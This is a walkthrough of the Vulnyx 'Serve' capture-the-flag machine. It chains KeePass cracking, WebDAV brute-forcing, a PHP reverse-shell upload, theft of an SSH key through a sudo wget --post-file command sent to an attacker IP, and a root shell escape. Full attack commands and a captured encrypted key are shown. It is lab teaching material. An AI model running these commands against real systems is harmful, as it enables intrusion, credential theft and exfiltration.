# Vulnyx: Serve

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `gobuster` · `curl` · `keepass2john` · `john` · `keepassxc` · `crunch` · `hydra` · `nc` · `ssh2john` |
| **Tags** | `#KeePass` `#MaskAttack` `#WebDAV` `#SudoAbuse` `#Exfiltration` `#ShellEscape` |
| **URL** | https://vulnyx.com/machines/ |

A KeePass database found through directory discovery is cracked, and one of its entries reveals a WebDAV password with its last three characters masked. A mask attack fills in the gap, giving WebDAV access that's used to upload and trigger a PHP web shell. From there, a `sudo` rule that lets a file be POSTed anywhere is abused to exfiltrate another user's SSH key, and a final `sudo` rule around a custom binary allows a shell escape straight to root.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn serve.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:4F:EF:6D (Oracle VirtualBox virtual NIC)
```

Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
sudo nmap -p 22,80 -sCV serve.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9a:0c:75:5a:bb:bb:06:a2:9a:7d:be:91:ca:45:45:e4 (RSA)
|   256 07:7d:e7:0f:0b:5e:5a:90:e9:33:72:68:49:3b:f5:8c (ECDSA)
|_  256 6c:15:32:a7:42:e7:9f:da:63:66:7d:3a:be:fb:bf:14 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:5A:7B:82 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

The main page:

```
http://serve.nyx
```
<img src="../Images/serve/Pasted image 20260517213505.png"/>

Two directory scans run — one against the site root, one specifically against a `/secrets` path once it's found:

```bash
gobuster dir -u 'http://serve.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html            (Status: 200) [Size: 10701]
javascript            (Status: 301) [Size: 317] [--> http://serve.nyx/javascript/]
notes.txt             (Status: 200) [Size: 173]
secrets               (Status: 301) [Size: 314] [--> http://serve.nyx/secrets/]
webdav                (Status: 401) [Size: 459]
server-status          (Status: 403) [Size: 277]
Progress: 882232 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
gobuster dir -u 'http://serve.nyx/secrets' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,htm,kdbx

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
db.kdbx                (Status: 200) [Size: 2078]
Progress: 1102790 / 1102790 (100.00%)
===============================================================
Finished
===============================================================
```

> **Endpoints:** `/webdav`, `/notes.txt`, `/secrets`

```
http://serve.nyx/notes.txt
```
<img src="../Images/serve/Pasted image 20260517213630.png"/>

```
Hi teo,
the database with your credentials to access the resource are in the secret directory
(Don't forget to change X to your employee number)
regards
IT department
```

The note does two things at once: it confirms `/secrets` is worth checking, and it explains in advance why the WebDAV password found later comes back with its last three characters masked — they're meant to be filled in with `teo`'s employee number.

## Initial Access

### Loot: A KeePass Database

A `.kdbx` file sits inside `/secrets`:

```bash
curl -s 'http://serve.nyx/secrets/db.kdbx' --output db.kdbx
```

Its master password hash is extracted and cracked:

```bash
keepass2john db.kdbx > kpass.txt

john kpass.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dreams            (db)
1g 0:00:00:15 DONE (2026-05-17 18:27) 0.06261g/s 41.07p/s 41.07c/s 41.07C/s sunshine1..sweetpea
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Master password:** `dreams`

The database opens, revealing a password with its last three characters masked out:

```bash
keepassxc
```
<img src="../Images/serve/Pasted image 20260517213735.png"/>
<img src="../Images/serve/Pasted image 20260517213755.png"/>

> **Partial password:** `w3bd4vXXX`

### Filling the Gap with a Mask Attack

Rather than guess, the unknown suffix is brute-forced directly. `crunch` generates every 9-character candidate that starts with the known prefix, with `%` standing in for a numeric digit in each of the last three positions:

```bash
crunch 9 9 -t w3bd4v%%% -o dictionary.txt
Crunch will now generate the following amount of data: 10000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000

crunch: 100% completed generating output
```

That small, targeted wordlist is sprayed against WebDAV with `hydra`:

```bash
hydra -l admin -P dictionary.txt -f serve.nyx http-get /webdav -v -I

[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
[DATA] attacking http-get://serve.nyx/webdav
[VERBOSE] Resolving addresses ...
[VERBOSE] resolving done
[80][http-get] host: serve.nyx   login: admin   password: w3bd4v513
[STATUS] attack finished for serve.nyx (1 valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-17 18:33:51
```

> **Credentials:** `admin:w3bd4v513`

### Shell as www-data

```
http://serve.nyx/webdav/
```
<img src="../Images/serve/Pasted image 20260517214000.png"/>
<img src="../Images/serve/Pasted image 20260517214012.png"/>


WebDAV allows uploading files directly via `PUT`. A PHP reverse shell is uploaded and then requested to trigger it:

```bash
curl -T rev_shell.php http://serve.nyx/webdav/ --digest -u admin:w3bd4v513
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/rev_shell.php has been created.</p>
<hr />
<address>Apache/2.4.38 (Debian) Server at 192.168.1.51 Port 80</address>
</body></html>

curl -s http://serve.nyx/webdav/rev_shell.php --digest -u admin:w3bd4v513
```

A listener catches the callback:

```bash
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.0.2.15] from (UNKNOWN) [server.nyx] 55042
Linux serve 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
 18:36:31 up 15 min,  0 users,  load average: 0.26, 3.18, 2.99
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

## Lateral Movement

### Escalating to teo

```bash
www-data@serve:/$ sudo -l
Matching Defaults entries for www-data on Serve:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on Serve:
    (teo) NOPASSWD: /usr/bin/wget
```

The current user can run `wget` as `teo` via `sudo`, with `--post-file` pointed at any local path. That flag uploads a file's contents as the body of an HTTP POST request — which means any file `teo` can read gets sent straight to an attacker-controlled listener, `teo`'s own SSH key included:

```bash
sudo -u teo /usr/bin/wget --post-file=/home/teo/.ssh/id_rsa 10.0.2.15:9002
```

A listener catches it:

```bash
nc -nlvp 9002
listening on [any] 9002 ...
connect to [10.0.2.15] from (UNKNOWN) [serve.nyx] 37504
POST / HTTP/1.1
User-Agent: Wget/1.20.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.0.2.15:9002
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 1743

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,6D251FAD3AF600FF

pdRdBLM15/otHzHNnZAxKb/AmzRlkZiTSwi2T0GV5Gji3qnJFJCJUHycQPoS+Tmb
y08X/RQB+IosSfcavMjP8aqcBpYOmPNRqegh6B6ArNZAblAp4W+TDu0IktrAQgL1
F9uex4C/Qe/vaVPPe4/pp/ZT0BCBOSi7pA97IKGSR9QIUFym1dNHOADr83fv4q2W
aN/pxKuypiu8AW2e97oboFJftZkyOqpfaWqrg5DBMN/49J1sHa3h+DLHCFylSRCc
KYH+VHHPjrxoeZdP/7bu6tu4MK0Nce9aqSZ5/AKtzHR/RPlUXQjt3tHxFXhpzjwA
8MErPtPSWfr/Ixv0/5u6yOA8u1oUmDPTCR/ZgIwqiD5q3//m8IuoBTpkl4qDw2NI
DBCmB8X+CohLWzYcFLrVLV8sRLS7KvCc+d1ACfOwDE2By6ND/q6Apc+zvXq1Dp5H
fZUvjOlYIxU+EvhDvdVv0kOEbc4PSuGQueJ/9Fg6Q7+uTkYO+ZHO3uNboy6sICx
EXAni9JblJlSNt9yXAVW/4GkxLe6acz7tZQFINCsPP9Zu2fSAI+AlOOJVMh/2rkh
nZrgvhsluEgMk2BbaYHz95veOYUG9VyesWgLWqn/UXCXm1XcaZXH0oajy9Iz/fW
ggnf2o0i4Iu4pPx4yTRaMeX1afKILi+MAVr1uUqrqnM5KwJZCaFdllGAxSJfyk/y
QwfGIUz/Kslgff9TMIxxxzLCmpq8V1TdpzY0T3Fg3lr6+Ic3Z4HMLXfoo8d9UpgM
0jWyJnGyT3KFM7GTpuYMgStEuS+ZAl1yO5SKj7qBdF5Xjj93IJ6PcJA3/FAlQBb
0lOSKRoF3i6qeUf9+PDfJqbDmE3SSMV0LHf6ZMSkcBkQu/QTyvNiME3zpO6UgQWl
HSVwYmfBH6dtbL6W3LFByoszPaVcvRCuaKLECVDrvdtNmP/YhVsSIyq8ZteVngmG
TFkXm57J4mC0TT7mddP9BIzPIs7FN05oeTzVyw5kxhoXHMJzo9FdU6e3rfVsJNNV
eqA8cM1Aeo+U9V90+omg8kYd/3gJEsui3JJoABzQlBJwMejx7pFD6X3Fy0v+C8Gj
x5yAigeJaZnUWDn2aGHKf4wBBFcOFiwPI6GPuGkvDfTvIoaYwacpHkvP5N2Ssg1r
FvzKoh9Wdk4D1yGoLUd8wJNV90
```

The key is passphrase-protected. It's saved locally and cracked:

```bash
nano teo_rsa
chmod 600 teo_rsa
ssh2john teo_rsa > teo_rsa.hash
```
```bash
john teo_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
private           (teo_rsa)
1g 0:00:00:00 DONE (2026-05-17 18:39) 100.0g/s 201600p/s 201600c/s 201600C/s melinda..jesusfreak
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Passphrase:** `private`

```bash
ssh -i teo_rsa teo@serve.nyx
Warning: Permanently added 'serve.nyx' (ED25519) to the list of known hosts.
Enter passphrase for key 'teo_rsa':
Linux serve 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
teo@serve:~$ id
uid=1000(teo) gid=1000(teo) grupos=1000(teo)
teo@serve:~$ ls -l /home/teo/
total 4
-rwx------ 1 teo teo 33 abr 19  2023 user.txt
teo@serve:~$ cat /home/teo/user.txt
28bf16070abffab749a16bd11f635474
```

> **User flag:** `28bf16070abffab749a16bd11f635474`

## Privilege Escalation

### Shell Escape in a Custom `sudo` Binary

```bash
teo@serve:~$ sudo -l
Matching Defaults entries for teo on Serve:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User teo may run the following commands on Serve:
    (root) NOPASSWD: /usr/local/bin/bro
```

`teo` can run `/usr/local/bin/bro` as root. It's a custom tool, not something with a documented GTFOBins entry, so its behavior is checked directly:

```bash

teo@serve:~$ sudo /usr/local/bin/bro
Bro! Specify a command first!

    * For example try bro curl

    * Use bro help for more info
teo@serve:~$ sudo /usr/local/bin/bro curl
```
<img src="../Images/serve/Pasted image 20260517214348.png"/>

One of its subcommands (`curl`) drops into a mode that accepts a shell escape — the same pattern seen in tools like `less`, `vi`, or `ftp`, where a leading `!` runs the rest of the line as a shell command instead of passing it to the tool itself:

```bash
!/bin/bash
```

```bash
root@serve:/home/teo# id
uid=0(root) gid=0(root) grupos=0(root)
root@serve:/home/teo# ls -l /root
total 4
-rwx------ 1 root root 33 abr 19  2023 root.txt
root@serve:/home/teo# cat /root/root.txt
981f4425d4ffcb3fb2fe145463b1d476
```

> **Root flag:** `981f4425d4ffcb3fb2fe145463b1d476`

## Takeaways

- A partially masked password isn't a dead end — if the pattern and length are known, a mask attack with a tool like `crunch` narrows the search space enough to make brute-forcing the rest practical.
- `sudo` rules built around generic network tools (`wget`, `curl`, `scp`) are risky in ways that go beyond running arbitrary commands — flags like `--post-file` can turn them into an exfiltration primitive for any file the target user can read.
- Custom tools granted through `sudo` need the same scrutiny as well-known binaries; an internal wrapper with a "debug" or "advanced" mode can carry the same shell-escape risk as `less` or `vim`, just without a GTFOBins entry to point to it.